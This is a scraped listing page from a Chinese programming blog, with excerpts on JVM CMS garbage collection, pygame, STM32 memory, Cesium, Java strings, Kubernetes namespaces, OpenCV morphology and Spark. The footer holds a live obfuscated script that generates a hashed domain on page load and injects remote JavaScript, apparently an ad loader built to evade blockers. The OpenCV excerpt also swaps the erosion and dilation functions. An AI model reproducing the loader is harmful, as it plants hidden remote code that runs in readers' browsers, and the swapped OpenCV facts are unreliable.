也就是CMS在进行5次Full GC(标记清除）之后进行一次标记整理算法，从而可以控制老年带的碎片在一定数量以内，甚至可以配置CMS在每次Full GC的时候都进行内存的整理。
2.1 垃圾回收过程 参考链接: CMS&amp;G1垃圾回收算法.
参考链接: 详解CMS垃圾回收机制.
新生代采用复制算法，会暂停所有用户线程。
老年代采用CMS，而这种垃圾回收器的回收过程主要分成四个过程：
2.1.1 初始标记 初始标记其实就是对被我们GC ROOT直接引用的对象做一个标记，在这个过程中将会触发一次STW（stop the word）机制，但是时间很短可以忽略。
当前阶段标记老年代的GC Roots对象和新生代存活的对象引用到老年代的对象（非老年代引用新生代，是新生代引用到老年代的跨代引用，这里需要遍历整个新生代，主要是标记老年代的对象可达），然后把这个GC Roots push到标记栈(mark-stack)；
2.1.2 并发标记 从标记栈(mark-stack)pop出对象，递归遍历出所有的子对象，然后把子对象继续push到标记栈(mark-stack)，重复这个过程直到所有对象被标记，然后标记栈(mark-stack)为空；
应用线程期间发生：
新生代晋升老年代；
直接在老年代分配；
老年代引用关系发生变化（新增，删除，变更）；
这些对象在都会触发写屏障标识为dirty，放到一个叫ModUnionTalble（主要是为了解决在YGC时应用程序删除了某个新生代对原来dirty card中对象的引用，写屏障捕获后标识为clean的场景）的类似Card Table（写屏障标识dirty card的动作应该会在每个并发阶段被触发）；
在进行并发标记的过程中，我们的用户线程和CMS线程会一起执行。CMS所做的一件事情就是把堆里的所有引用对象全部找到并做标记。
但是在这个过程中可能会发生对象状态被改变的问题。
1、比如我的一个对象的引用链已经断开，变成了垃圾对象，但是CMS已经对他做过标记判断为非垃圾对象了怎么办？这就是在并发标记过程中产生的浮动垃圾（多标问题）
2、比如本来一个对象在CMS标记的过程中把他标记成了垃圾对象但是后来我们有引用了，结果在我们用的时候垃圾对象已经被干掉了，那我们是不是在引用这个对象的时候就会找不到这个垃圾对象。（漏标问题）
这时候我们的第五步就产生了。
2.1.3 并发预清理（CMS-concurrent-preclean） 扫描新生代确定之前未被标记的老年代对象的可达性，将老年代的对象标记为存活；扫描ModUnionTalble并处理dirty card；
并发预清理阶段，也是一个并发执行（可与用户线程一起执行）的阶段，主要解决新生代晋升的问题，新分配到老年代的对象以及并发被修改的对象。在本阶段，会查找前一阶段执行过程中,从新生代晋升或新分配或被更新的对象。通过并发地重新扫描这些对象，预清理阶段可以减少下一个stop-the-world 重新标记阶段的工作量。
并发预处理阶段做的工作还是标记，与重标记功能相似。既然相似为什么要有这一步？
前面我们讲过，CMS是以获取最短停顿时间为目的的GC。重标记需要STW（Stop The World），因此重标记的工作尽可能多的在并发阶段完成来减少STW的时间。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a05e788bafedd9a051b234d948b1d674/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a4ab7db58df3cc4115ed57df82f019e/" rel="bookmark">
			python_飞机大战源代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本代码学习于黑马程序员，开发环境基于IDEA，pygame模块。图片资源私博主~
先上效果图
plane_main.py
import pygame from plane_sprites import * class PlaneGame(object): def __init__(self): print("游戏初始化") # 创建游戏窗口 self.scree = pygame.display.set_mode(SCREE_RECT.size) # 创建游戏时钟 self.clock = pygame.time.Clock() self.__reate_sprites() # 定时出现敌机 pygame.time.set_timer(CREATE_ENEMY_EVENT, 1000) pygame.time.set_timer(HERO_FIRE_EVENT, 400) def __reate_sprites(self): # 创建背景 bg1 = Background() bg2 = Background(True) self.back_group = pygame.sprite.Group(bg1, bg2) self.enemy_group = pygame.sprite.Group() self.hero = Hero() self.hero_group = pygame.sprite.Group(self.hero) # 创建敌机精灵组 def start_game(self): while True: self.clock.tick(FRAME_PER_SEC) self.__event_handler() self.__check_collide() self.__update_sprites() pygame.display.update() # 设置创新帧率 def __event_handler(self): for event in pygame.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a4ab7db58df3cc4115ed57df82f019e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15ae5962288d2e696bcd4c0cc6fdfcc1/" rel="bookmark">
			单片机Flash大小和RAM大小空间理解与分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们以上图中的 STM32为例来进行分析和理解
1,空间大小问题
Flash大小 32kBytes 意思是 321024 = 32768 字节(Bytes)
RAM大小 8kBytes 意思是 81024 = 8192字节(Bytes)
2,代码及变量存储问题
我们以KEIL编译器 给我们提供的信息为例来进行分析和理解 如下图 整个程序被分为了 4部分
1,代码: 编译后的代码 会存储在 Flash 中. (这样掉电不会丢失)
2,只读数据: 只读数据(大多为常量) 存储在 Flash 中. (这样掉电不会丢失)
3, 已经赋值的变量: 已经赋初值的变量 用户定义的初值也会存储在 Flash 中. (这样掉电不会丢失). 同时上电程序初始化运行的时候会把 此数据拿出来 放到RAM中
4, 没有赋值的变量: 没有赋值的变量 会在上电程序运行的过程中 存在RAM中 (掉电丢失)
所以我们得到结论 Falsh 应该满足1+2+3
RAM 应该满足 2+3
另外我们还需要注意 单片机本身底层的一些 处理逻辑也会占用一部分
我们来看一下代码超过编译内存后的提示:
英文提示
中文提示:
提示中 我们可以得知 该芯片链接器生成的内容也会占用 Flash大小39字节
同时 这39字节大小 已经在1 代码 这部分中被包含在里面了,所以我们计算的时候 就不需要在加上这39字节的数据了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f563a5b971610de46944485c5524471/" rel="bookmark">
			C1——cesium添加标签组，及显示影藏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		效果：给航飞数据添加小区的名字label。
标签带竖线。可以控制显示影藏。高度低于1100m显示，否则自动影藏
用 parent属性便于控制标签显示影藏。直接让labels.show=true/false;
代码：
1：定义数据（数组）
2：定义方法
// 倾斜摄影数据上添加lable的方法 putLables(_datas, _parent) { let _this = this; for (let i = 0; i &lt; _datas.length; i++) { let data = _datas[i]; let entity = _this.viewer.entities.add({ //参数顺序：经度、纬度 position: Cesium.Cartesian3.fromDegrees(data.lon, data.lat, data.height),//标签的位置 parent: _parent, polyline: {//竖线 show: true, positions: Cesium.Cartesian3.fromDegreesArrayHeights([ data.lon, data.lat, 340, data.lon, data.lat, data.height - 2 ]), distanceDisplayCondition: new Cesium.DistanceDisplayCondition(0, 1500),//高于多少m的时候，不可见 width: 1, material: Cesium.Color.fromCssColorString('#fdeb13'), outlineColor: Cesium.Color.fromCssColorString('#3ab70b'), outlineWidth: 2 }, label: { text: data.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5f563a5b971610de46944485c5524471/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aee7fde8e15f185412e04bcd44d985e6/" rel="bookmark">
			String数据类型的初始值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		String数据类型的初始值 推断变量 str1 和 str2 的值是什么？
String str1;	// str1 = null String str2 = new String();	// str2 = "" 现在用程序跑一遍，测试一下结果
public class TestString { public static void main(String[] args) { String str1; String str2 = new String(); //System.out.println(str1); // 报错：Variable 'str1' might not have been initialized System.out.println(str2); } } 说明变量 str1 还未初始化，所以输出不了，而变量 str2 输出为空，可以再一次进行测试，str2 的结果：
System.out.println(str2.length());	// 结果为0 而一般如果变量 str1 需要用到，但不用 new 一个新的对象，可以对变量 str1 赋空值
String str1 = null; 这样就不会报错了，程序也可正常运行。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/224ce6b53e37650ecbe03a2a346a8e05/" rel="bookmark">
			k8s部署-31-k8s中如何进行资源隔离资源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在k8s中的我们的资源如何隔离呢？如果说有一个服务异常了，内存无限制的占用，其他的服务岂不是无法部署上去了？
而且我们一般一个集群是给很多人，很多对象使用的，那么如何保证他们互不打扰？且无法看到其他人的相关内容呢？
Namespace
一个重要的概念，Namespace，我们之前说过，但是没有细说他的功能是什么，他可以实现资源隔离和配额的隔离，比如下面的信息：
从上图可以清晰的看到他能做什么，接下来实际操作下吧。
新建namespace
首先我们先查询下本地有多少个namespace；
[root@node1 ~]# kubectl get namespace NAME STATUS AGE default Active 18d kube-node-lease Active 18d kube-public Active 18d kube-system Active 18d [root@node1 ~]# 再看下命名空间中都有什么呢？这里我们只查看pod哈。
[root@node1 ~]# kubectl get pods NAME READY STATUS RESTARTS AGE deploy-springboot-5dbfc55f78-mpg69 1/1 Running 1 21h nginx-ds-q2pjt 1/1 Running 17 11d nginx-ds-zc5qt 1/1 Running 22 17d [root@node1 ~]# kubectl get pods -n kube-node-lease No resources found in kube-node-lease namespace. [root@node1 ~]# kubectl get pods -n kube-public No resources found in kube-public namespace.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/224ce6b53e37650ecbe03a2a346a8e05/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18307528182615ea7b241f3ac13ecb3c/" rel="bookmark">
			python：opencv形态学转换之腐蚀膨胀操作 开闭运算 实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、腐蚀/膨胀 膨胀操作：是对高亮的部分向外进行扩大，输出图的高亮部分要大于原图区域。它可以做到把图像周围背景合并到物体中，如果两个物体之间具体较近，那么膨胀运算就会使得这两个物体连接在一起，所以膨胀对于填补图像分割后的空洞很有用处。对于灰度图像的膨胀操作一般采用极大运算，提升图像整体亮度，增强图像的亮细节，消除暗细节。对于二值图像，膨胀操作可以扩大白色区域的面积，在元白色目标的轮廓上增加设定的大小。在Python中常用执行膨胀操作的函数为eroda函数。
腐蚀操作效果与膨胀操作完全相反，是原图中高亮的区域被识别然后按设定的比例向内减小，输出结果图的高亮部分要小于原图。它能消除目标物体的边界轮廓，可以把小于结构元素的点去除。如果图像两个目标物体之间有细微的连接，则可以通过设定卡好的结构元素，通过腐蚀操作将两目标物体分开，又不会损害到两物体的形态信息。灰度图像的腐蚀操作采用极小运算，使图像的整体变暗，增强图像的暗细节，削弱了亮细节。对于二值图像，腐蚀操作可以缩小白色区域，扩大黑色区域。常用dilate函数实现腐蚀操作。
#腐蚀膨胀操作程序 起始点 import cv2 import numpy as np import matplotlib.pyplot as plt img2 = cv2.imread('C:/Users/asus/Pictures/Saved Pictures/er1.jpg') #读取图像 kernel = np.ones((9,9), np.float32) result1 = cv2.erode(img2,kernel) #腐蚀运算 result2 = cv2.dilate(img2,kernel) #膨胀运算 titles = ['original image','erode', 'dilate'] #输出图片命名 imgs = [img2,result1,result2] for i in range(3): plt.subplot(2,3,i+1)#注意，这和matlab中类似，没有0，数组下标从1开始 plt.imshow(imgs[i]) plt.title(titles[i]) plt.xticks([]), plt.yticks([]) plt.show() #腐蚀膨胀运算程序 结束点 结果分析：
从原图可以看出图中字母部分为暗区域，字母中分布着白色的像素点，在白色外围区域上有黑色像素块构成的噪声。从结果可以看到腐蚀操作扩大了暗区域，溶解了高亮区域，很容易去除了字母内的白色像素点：而膨胀操作扩大了白色区域，很好地去除了摆设背景下的黑色噪音。
二、开/闭运算 开闭运算同样是具有相反操作过程的运算，但它们的用处有相似的地方，都能用来平滑边界。开运算是先腐蚀再膨胀，可用来消除细小噪声，去毛刺，在纤细处分离物体以及平滑较大物体边界的作用。闭运算是先膨胀再腐蚀，能用来填充物体内部的细小空洞，连接临近物体和平滑边界。
import cv2 import numpy as np import matplotlib.pyplot as plt ori = cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/18307528182615ea7b241f3ac13ecb3c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf759339407d2b28ebc82d6d8e4668b3/" rel="bookmark">
			Spark 简单介绍 基本概念 和MapReduce的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.概述 Spark是一种快速而通用的集群计算的平台，Spark 的一个主要特点就是能够在内存中进行计算，因而更快。 2.特点 与Hadoop的MapReduce相比，Spark基于内存的运算要快100倍以上，基于硬盘的运算也要快10倍以上。Spark实现了高效的 DAG执行引擎，可以通过基于内存来高效处理数据流。 Spark提供了统一的解决方案。Spark可以用于批处理、交互式查询（Spark SQL）、实时流处理（Spark Streaming）、机器学习（Spark MLlib）和图计算（GraphX）。 Spark Core实现了任务调度、内存管理、错误恢复与存储系统交互等模块，并且还包含了对弹性分布式数据集（Resilient Distributed Dataset，简称RDD）的API的定义。它主要担任了系统管理员的角色。 Spark SQL 主要用来操作结构化数据的程序包，通过Spark SQL可以使用SQL或者hive版本的HQL来查询数据库。 Spark Streaming 主要是对实时数据进行流式计算。Spark Streaming 提供了用来操作数据流的 API，并且与 Spark Core 中的 RDD API 高度对应 MLib提供了很多机器学习算法。包括分类、回归、聚类、协同过滤等，还提供了模型评估、数据导入等额外的支持功能。 GraphX用来操作图，可以并行的进行图计算，支持了图的各种操作。 Spark SQL组件是经常用到的，使用hql语句从Hive中读取结构化的数据，存为RDD数据集，进行一些操作后分布式存储到hdfs中。 3.Spark基本概念 Application：Spark用户程序，用户提交一次应用为一个App，一个App产生一个SparkContext。 Job：一个App可被划分为多个Job，划分标记为action动作；action动作有collect,count等。 Stage：每个Job会被划分多层Stage，划分标记为shuffle过程；Stage按照父子（血统）关系依次执行。 Task：具体的执行任务单位，被发到executor上执行具体任务。 Cluster Manager：集群资源管理服务，通常包含主节点（主备）和多个运行节点；支持运行模式有Standalone、Mesos(用得少)、Yarn。 Driver：运行App的大脑，负责job的初始化，将job转换成task并提交执行。 DAGScheduler：是一个面向Stage层面的调度器，按照Stage提交Task集合给TaskScheduler。 TaskScheduler：提交Task给Executor运行，并管理执行结果。 BlockManager：管理App运行周期的中间数据，比如存在内存、本地。 Executor：是App运行在worker node上的一个进程，该进程负责运行Task，生命周期和App相同 4.Spark与MapReduce的区别 Spark是MapReduce的替代方案，而且兼容HDFS、Hive，可融入Hadoop的生态系统，以弥补MapReduce的不足。可以直接对HDFS进行数据的读写，同样支持Spark on Yarn。Spark可以与MapReduce运行于同集群中，共享存储资源与计算。 spark把中间计算结果存放在内存中，减少迭代计算过程中的数据落地，运算效率高。MapReduce中的计算中间结果是保存在磁盘上的，运算效率差。 spark容错性高。spark支持DAG图的分布式并行计算。DAG：有向无环图，描述了任务间的先后依赖关系。 spark通用性高。MapReduce只提供了map和reduce两种操作，spark提供的操作类型有很多，分为转换和行动操作两大类。转换操作包括：map,filter,flatmap,sample,groupbykey,reducebykey,union,join,cogroup,mapvalues,sort,partitionby等多种操作，行动操作包括：collect,reduce,lookup和save等操作。 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/153/">«</a>
	<span class="pagination__item pagination__item--current">154/306</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/155/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>